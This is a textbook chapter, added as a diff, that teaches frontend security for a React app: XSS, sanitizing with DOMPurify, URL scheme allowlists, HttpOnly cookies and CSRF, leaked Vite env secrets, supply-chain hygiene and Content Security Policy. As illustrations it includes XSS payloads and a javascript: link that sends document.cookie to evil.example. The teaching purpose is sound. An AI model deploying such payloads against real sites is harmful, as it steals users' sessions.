@@ -1,0 +1,336 @@
+> 📖 **The problem.** TaskFlow lets people comment on tasks, and the product team wants **markdown** in comments: bold, links, code. A teammate adds it in an afternoon. The component converts markdown to HTML and renders it with `dangerouslySetInnerHTML`; the demo looks great. Then a security-minded colleague posts one comment that contains an image tag with a broken source and an `onerror` handler. Every person who opens that task now runs her script. Her proof-of-concept reads the auth token out of `localStorage`, and sends it to a server she controls. Anyone who viewed the comment is compromised, including the admins. The fix was a one-line sanitizer. The bug was one line, too.
+
+Frontend developers often assume security is "the backend's job". The backend does own the data and the rules, but **your code runs on the user's machine, inside their logged-in session**, and a bug in it can be turned against them. This chapter gives you a practical threat model, shows how cross-site scripting (XSS) actually happens in React and how to stop it, covers URLs, tokens, environment variables and dependencies, and ends with the browser's strongest backstop: a Content Security Policy.
+
+> 🧠 **Mental model.** **The browser is enemy territory.** Anything you ship is public, anything you render may be hostile, and anything the client says must be verified by the server.
+
+## 74.1 The frontend threat model
+
+A **threat model** answers three questions: *what are we protecting, who might attack it, and how?* For a frontend, the assets are the user's **session** (tokens, cookies), their **data**, and their **trust** in what the page shows. The attackers are mostly not "hackers breaking your server". They are:
+
+- **Other users** who put hostile content into the system (comments, task titles, profile names), hoping your app will render it as code.
+- **Third parties** you load code from: npm packages, analytics scripts, ad tags. They run with full access to your page.
+- **The user themselves**, who can open devtools, edit any request, flip any `if (isAdmin)` check, and replay your API with a script.
+
+What attackers **can** do: read and change anything in the page they get code into (DOM, storage, cookies without `HttpOnly`), call your API as the user, and read your shipped JavaScript. What they **cannot** do, from a web page: read files on the user's disk, or read another site's data (the **same-origin policy** blocks that), unless you accidentally give them the key.
+
+```ts
+// Client-side checks are UX, not security. The user controls this code.
+function canDelete(user: User, task: Task): boolean {
+  return user.role === "admin" || task.ownerId === user.id; // ✅ hides the button
+}                                                            // ❌ does NOT stop a hand-crafted DELETE request
+```
+
+Two defensive principles follow. **Defense in depth**: assume any single layer (escaping, validation, CSP) can fail, and stack several. **Least privilege**: give tokens, scripts, and dependencies only the access they need, for the shortest time.
+
+## 74.2 XSS
+
+**Cross-site scripting (XSS)** is an attacker getting *their* JavaScript to run in *your* page, under your origin. Once it runs, it can do anything your own code can.
+
+React helps by default: when you render `{comment.body}` in JSX, React **escapes** it, so the text is inserted as text, never parsed as HTML. The hostile string is displayed literally:
+
+```tsx
+const body = '<img src=x onerror="alert(1)">';
+
+function Comment() {
+  return <p>{body}</p>; // ✅ shows the characters on screen; nothing executes
+}
+```
+
+The danger arrives when you **opt out** of that protection. The most famous way is `dangerouslySetInnerHTML`, named to warn you. Others: assigning `element.innerHTML` through a ref, `document.write`, and `eval`-like APIs.
+
+```tsx
+function Comment({ html }: { html: string }) {
+  return <div dangerouslySetInnerHTML={{ __html: html }} />; // ❌ runs whatever is in `html`
+}
+```
+
+If you truly need user-supplied HTML (a rich-text editor, rendered markdown), **sanitize** it first with a maintained library. **DOMPurify** parses the HTML and strips anything dangerous (scripts, event-handler attributes, `javascript:` URLs) while keeping safe formatting:
+
+```tsx
+import DOMPurify from "dompurify";
+import { marked } from "marked";
+
+function MarkdownComment({ source }: { source: string }) {
+  const dirty = marked.parse(source, { async: false });          // markdown -> HTML (still untrusted!)
+  const clean = DOMPurify.sanitize(dirty, { USE_PROFILES: { html: true } });
+  return <div className="comment" dangerouslySetInnerHTML={{ __html: clean }} />;
+}
+```
+
+Sanitize **as late as possible, on the final string you inject**, and never write your own regex-based sanitizer: HTML parsing has too many corner cases.
+
+Often you can avoid raw HTML altogether. A markdown renderer that builds React *elements* (such as `react-markdown`) never inserts raw HTML unless you enable it, so there's nothing to sanitize:
+
+```tsx
+import ReactMarkdown from "react-markdown";
+
+function SafeComment({ source }: { source: string }) {
+  return <ReactMarkdown>{source}</ReactMarkdown>; // ✅ renders elements, not strings of HTML
+}
+```
+
+> ⚠️ **Common mistake.** Sanitizing on the way **in** (before saving) and trusting the stored value afterwards. Sanitizer rules improve over time and data outlives them. Sanitize on output, and also on the server if other clients consume the data.
+
+## 74.3 URL and attribute injection
+
+Escaping protects *text*, but some attributes are **executable**. An `href` or `src` that starts with `javascript:` runs code when clicked. React does not block this reliably: a link built from user data is an injection point.
+
+```tsx
+function Website({ url }: { url: string }) {
+  return <a href={url}>Visit website</a>;
+  // ❌ if url is "javascript:fetch('https://evil.example/?c='+document.cookie)", clicking it runs it
+}
+```
+
+User-controlled URLs come from profile "website" fields, redirect parameters (`?next=...`), and markdown links. The defense is an **allowlist**: parse the URL, and accept only the schemes you expect. Never use a *denylist* ("block `javascript:`"), because attackers use `JaVaScRiPt:`, embedded tabs, `data:` URLs, and others you didn't think of.
+
+```ts
+const ALLOWED_PROTOCOLS = new Set(["http:", "https:", "mailto:", "tel:"]);
+const BASE = "https://app.taskflow.example";
+
+/** Returns a safe absolute URL, or null if the input is not acceptable. */
+export function safeHref(input: string): string | null {
+  try {
+    const url = new URL(input.trim(), BASE); // relative URLs resolve against BASE
+    return ALLOWED_PROTOCOLS.has(url.protocol) ? url.href : null;
+  } catch {
+    return null; // not parseable as a URL at all
+  }
+}
+```
+
+Using the real `URL` parser matters: it normalizes case and strips embedded tabs and newlines the same way the browser will, so what you check is what the browser sees. Behavior on attack payloads:
+
+```ts
+safeHref("https://example.com/a");        // "https://example.com/a"
+safeHref("/tasks/42");                    // "https://app.taskflow.example/tasks/42"
+safeHref("javascript:alert(1)");          // null
+safeHref("  JaVaScRiPt:alert(1)");        // null  (case and spaces)
+safeHref("java\nscript:alert(1)");        // null  (embedded newline is stripped by the parser)
+safeHref("data:text/html,<script>1</script>"); // null
+safeHref("//evil.example/x");             // "https://evil.example/x"  (!)
+```
+
+The last line shows the limit of a scheme check: **it doesn't make the link trustworthy, only non-executable**. For redirect targets (`?next=`), also require the *origin* to be your own, otherwise you have an open redirect, which attackers use for phishing. Use it in the component:
+
+```tsx
+function Website({ url }: { url: string }) {
+  const href = safeHref(url);
+  if (!href) return <span>{url}</span>; // show as plain text instead
+  return <a href={href} target="_blank" rel="noopener noreferrer">Visit website</a>;
+}
+```
+
+`rel="noopener noreferrer"` on `target="_blank"` links stops the opened page from controlling yours through `window.opener` and from receiving a `Referer`. Modern browsers imply `noopener`, but being explicit is harmless.
+
+## 74.4 Tokens and sessions
+
+After login, the browser needs to prove who the user is on every request. Where the proof lives decides what an XSS attack can steal.
+
+| Storage | Readable by JavaScript? | Sent automatically? | Main risk |
+|---|---|---|---|
+| `localStorage` / `sessionStorage` | Yes | No | Any XSS reads the token and exfiltrates it |
+| JavaScript memory (a variable) | Yes | No | Lost on refresh; XSS can still use it while the page is open |
+| Cookie with `HttpOnly` | **No** | Yes | CSRF (see below), unless `SameSite` is set |
+
+`HttpOnly` cookies can't be read by scripts, so a stolen script can still *act as the user while the page is open*, but it **can't walk away with the credential**. That makes them the usual recommendation for session tokens. A common design is a short-lived access token held in memory and a long-lived refresh token in an `HttpOnly` cookie.
+
+Because browsers attach cookies to requests automatically, a hostile site could make your user's browser send a request to your API ("a write that nobody intended"). This is **cross-site request forgery (CSRF)**. The main cookie flags:
+
+```text
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
+```
+
+- **`HttpOnly`**: not readable from JavaScript.
+- **`Secure`**: sent only over HTTPS.
+- **`SameSite=Lax` (or `Strict`)**: not sent on most cross-site requests, which blocks the typical CSRF form post. `Lax` is a good default; `None` requires `Secure` and reopens the risk.
+
+For state-changing requests, add a defense the server verifies: a **CSRF token** (a random value sent in a header that a foreign site can't read) or a required custom header. On the client, that looks like this:
+
+```ts
+async function api<T>(path: string, init: RequestInit = {}): Promise<T> {
+  const res = await fetch(`/api${path}`, {
+    ...init,
+    credentials: "include",                                // send the HttpOnly cookie
+    headers: { "Content-Type": "application/json", "X-CSRF-Token": getCsrfToken(), ...init.headers },
+  });
+  if (!res.ok) throw new Error(`HTTP ${res.status}`);
+  return (await res.json()) as T;                          // validate it: see Chapter 32
+}
+```
+
+> 🚫 **When not to.** Don't store long-lived tokens in `localStorage` just because it's easy. If your architecture forces it (a third-party API with bearer tokens), keep them short-lived, and put extra effort into XSS defense and CSP.
+
+## 74.5 Secrets and env vars
+
+A **secret** is a value that gives power to whoever holds it: an API key with write access, a database URL, a signing key. The browser downloads your entire JavaScript bundle, so **anything bundled into the frontend is public**. Minification is not encryption.
+
+Vite makes this concrete. Only variables prefixed with `VITE_` are exposed to your code through `import.meta.env`, and the build **replaces them with their literal values** in the output:
+
+```sh
+# .env
+VITE_API_URL=https://api.taskflow.example     # ✅ public by nature: the browser must call it
+VITE_STRIPE_SECRET_KEY=sk_live_abc123         # ❌ now readable by every visitor
+DATABASE_URL=postgres://admin:hunter2@db/prod # not exposed by Vite, and still must never be in client code
+```
+
+```ts
+const apiUrl = import.meta.env.VITE_API_URL; // inlined at build time
+```
+
+You can verify it yourself. After `npm run build`, search the output: the key is sitting there as plain text, and anyone can read it in the Network tab.
+
+```sh
+grep -r "sk_live" dist/   # finds it. A "secret" in VITE_ is not a secret.
+```
+
+The `VITE_` prefix is a guardrail against *accidents*, not a way to hide anything. The rule: **public config** (API base URL, a publishable key designed for browsers, a feature-flag client ID) can go in the bundle. **Secrets** live on a server, behind your own API, which calls the third party on the user's behalf. If a secret ever reached the bundle or git history, treat it as leaked and **rotate it**: removing it from the code doesn't un-publish it.
+
+> ⚠️ **Common mistake.** Committing `.env` files with real values. Commit a `.env.example` with placeholder values, and list `.env*` in `.gitignore`.
+
+## 74.6 Dependency and supply-chain risk
+
+A typical React app ships code from hundreds of npm packages, mostly written by strangers, and each one runs with the full privileges of your page. A **supply-chain attack** compromises that code: a maintainer's account is hijacked, a malicious version is published, or a look-alike package name ("typosquatting") is installed by mistake.
+
+Your defenses are mostly habits and configuration:
+
+- **Commit the lockfile** (`package-lock.json`) and install from it in CI with `npm ci`, which fails if the lockfile and `package.json` disagree, so every build uses exactly the reviewed versions.
+- **Audit regularly.** `npm audit` reports known vulnerabilities in your tree. Automate it ([Chapter 76](/chapter/76)), and triage by whether the vulnerable code is actually reachable in the browser.
+- **Update on a schedule** with automated pull requests, so fixes arrive in small steps instead of a risky big-bang upgrade.
+- **Be stingy with new dependencies.** Before adding one, check maintenance, download count, size, and whether a ten-line function would do.
+- **Limit install scripts.** Packages can run code during install. Use `npm ci --ignore-scripts` in CI where you can.
+- **Pin and review** for high-risk packages, and prefer packages that publish **provenance** (a verifiable link from the package to its source and build).
+
+```sh
+npm ci                 # exact versions from the lockfile; fails on drift
+npm audit --omit=dev   # known vulnerabilities in production dependencies
+npm ls dompurify       # why is this package in my tree, and which version?
+```
+
+Third-party `<script>` tags (analytics, chat widgets) are the same risk with fewer protections. If you must load one, pin the version, load from a host you trust, and use **Subresource Integrity** (`integrity="sha384-…"`) when the file is static. The next section limits what they can do.
+
+## 74.7 Content Security Policy
+
+A **Content Security Policy (CSP)** is an HTTP header that tells the browser *which sources of code are allowed*. It's your backstop for XSS: even if an attacker injects `<script>` or an `onerror` handler, the browser refuses to run it unless the policy permits.
+
+```text
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  connect-src 'self' https://api.taskflow.example;
+  frame-ancestors 'none';
+  object-src 'none';
+  base-uri 'self'
+```
+
+Read it as an allowlist: scripts only from your own origin, network calls only to your API, no embedding in other sites' frames (`frame-ancestors`, which also prevents clickjacking), no plugins. Because it forbids inline scripts, an injected `<img onerror=...>` stops working.
+
+Rolling out a CSP on an existing app **breaks things**, so do it in stages:
+
+1. **Report-only first.** Send `Content-Security-Policy-Report-Only` with a `report-to` / `report-uri` endpoint. The browser logs what *would* have been blocked, without blocking it.
+2. **Fix or allow** each legitimate violation: move inline scripts to files, or give necessary inline scripts a per-response **nonce** (`script-src 'nonce-…'`) that the server generates.
+3. **Switch to enforcing**, then tighten over time.
+
+A Vite single-page app built to static files works well with `script-src 'self'`, because the production bundle has no inline scripts. Dev mode does inject some, so test your policy against the *built* app. If your host can't set headers, a `meta` tag works for most directives, but not `frame-ancestors`.
+
+> 🚫 **When not to.** Don't add `'unsafe-inline'` or `'unsafe-eval'` to `script-src` to make errors go away. That disables the protection that XSS defense relies on. Fix the cause instead.
+
+## 74.8 Never trust the client
+
+Everything above hardens the client, but the **final authority is the server**. Every request that reaches your API could have come from a script, not your UI: with any values, in any order, at any rate. So the server must:
+
+- **Authenticate** every request (who are you?) and **authorize** it (may *you* do *this* to *this* record?). Hiding the Delete button for non-owners is a UX decision; the check that matters is on the server ([Chapter 65](/chapter/65)).
+- **Validate** all input (types, lengths, ranges) and never rely on the form having done it.
+- **Rate-limit** and **log** sensitive actions.
+
+The frontend's responsibility mirrors this: **validate what comes back**, too. A response isn't trustworthy just because your own server sent it, since it may have been affected by a bug or by data another user supplied ([Chapter 32](/chapter/32)).
+
+```ts
+// Server (Node): authorization is checked here, not in the React component.
+app.delete("/api/tasks/:id", async (req, res) => {
+  const task = await db.tasks.find(req.params.id);
+  if (!task) return res.sendStatus(404);
+  if (task.ownerId !== req.user.id && req.user.role !== "admin") return res.sendStatus(403);
+  await db.tasks.delete(task.id);
+  res.sendStatus(204);
+});
+```
+
+The practical way to hold all of this is a **checklist** for every feature that renders user data, accepts input, or touches a token. Level 4 asks you to write one.
+
+## Common mistakes
+
+> ⚠️ **Rendering untrusted HTML without a sanitizer**, or sanitizing with a hand-written regex.
+
+> ⚠️ **Trusting a URL because it "looks like a link".** Allowlist the scheme with a real parser.
+
+> ⚠️ **Putting secrets in `VITE_` variables**, or committing `.env` files.
+
+> ⚠️ **Storing long-lived tokens in `localStorage`** in an app with any XSS surface (every app with user content).
+
+> ⚠️ **Treating client-side role checks as security.** They only shape the UI.
+
+> ⚠️ **Disabling CSP protections** (`unsafe-inline`) to silence a violation, instead of fixing it.
+
+## When to use it, and when not to
+
+> ✅ **Use it when** always, in layers: escape by default, sanitize when you must render HTML, allowlist URLs, keep tokens out of scripts' reach, minimize and audit dependencies, add a CSP, and verify everything on the server.
+
+> 🚫 **When not to.** Don't invent your own cryptography, sanitizer, or session system when a maintained library or your platform's auth provides one. And don't let security become theater: a CSP no one monitors and an unread `npm audit` report give a false sense of safety. Prefer a few measures you actually keep working.
+
+## How it connects
+
+> 🔗 **Connection.** Runtime validation at the boundary is [Chapter 32](/chapter/32); authentication and authorization are [Chapter 65](/chapter/65); the bundle that everyone can read is the subject of [Chapter 70](/chapter/70). Automated audits and dependency updates join the pipeline in [Chapter 76](/chapter/76), and security-relevant events belong in your logs ([Chapter 75](/chapter/75)).
+
+> 🌍 **Real world.** The OWASP Top 10 lists injection and broken access control among the most common web flaws. Frameworks protect you by default (React escaping, `HttpOnly` cookies from auth libraries), and most real incidents come from the few places where code opts out.
+
+## Exercises
+
+### Level 1 — Recall
+
+Name the vulnerability (or "none") in each snippet, and the fix:
+
+```tsx
+<div dangerouslySetInnerHTML={{ __html: task.description }} />
+<a href={user.website}>Website</a>
+localStorage.setItem("refreshToken", token);
+const key = import.meta.env.VITE_PAYMENTS_SECRET;
+<p>{task.title}</p>
+if (user.role === "admin") await fetch(`/api/users/${id}`, { method: "DELETE" });
+```
+
+### Level 2 — Application
+
+Safely render user-supplied markdown in the comment component. Do it two ways: once with `react-markdown`, and once with `marked` plus DOMPurify. Test both with a payload that contains an `onerror` image and a `javascript:` link.
+
+### Level 3 — Challenge
+
+Write `safeHref(url: string): string | null` and a table-driven test with at least ten attack payloads (mixed case, leading spaces, embedded tabs and newlines, `data:`, `vbscript:`, protocol-relative URLs, and malformed input). Add a variant `safeInternalPath` that allows only same-origin paths, for `?next=` redirects.
+
+*Hint: parse with `new URL(input, base)` and compare `url.origin` to `base`'s origin.*
+
+### Level 4 — Real-world
+
+**Ticket TF-420: Security review of TaskFlow Web.** Before the enterprise launch, the team needs a security baseline.
+
+- Write a one-page checklist covering rendering, URLs, tokens, env vars, dependencies, and server checks, with a pass or fail for the current app.
+- Add a CSP in report-only mode, collect violations for a week, then enforce it. Record each directive you had to allow and why.
+- Move any long-lived token out of `localStorage`, and confirm `HttpOnly`, `Secure`, and `SameSite` on the session cookie.
+- Add `npm audit` and a lockfile check to CI.
+
+## Key takeaways
+
+- The browser is enemy territory. Anything you ship is public, anything you render may be hostile, and the server must verify everything.
+- React escapes text by default. XSS appears where you opt out: `dangerouslySetInnerHTML`, `innerHTML`, and executable attributes. Sanitize with DOMPurify or avoid raw HTML.
+- Validate URLs with an **allowlist** of schemes through the real `URL` parser. A `safeHref` is the minimal defense.
+- Prefer `HttpOnly`, `Secure`, `SameSite` cookies over `localStorage` for sessions, and protect state-changing requests from CSRF.
+- Every `VITE_` variable ends up in the bundle. Never put secrets there. If one leaked, rotate it.
+- Commit the lockfile, use `npm ci`, audit, update on a schedule, and add dependencies sparingly.
+- A CSP limits the damage when something slips through. Roll it out report-only first.
+
+## What comes next
+
+Security is about stopping bad things you can predict. Observability is about finding out about the things you couldn't. In [Chapter 75](/chapter/75) we add logging, error tracking, typed analytics events, performance monitoring, feature flags, and the privacy rules that govern all of it.
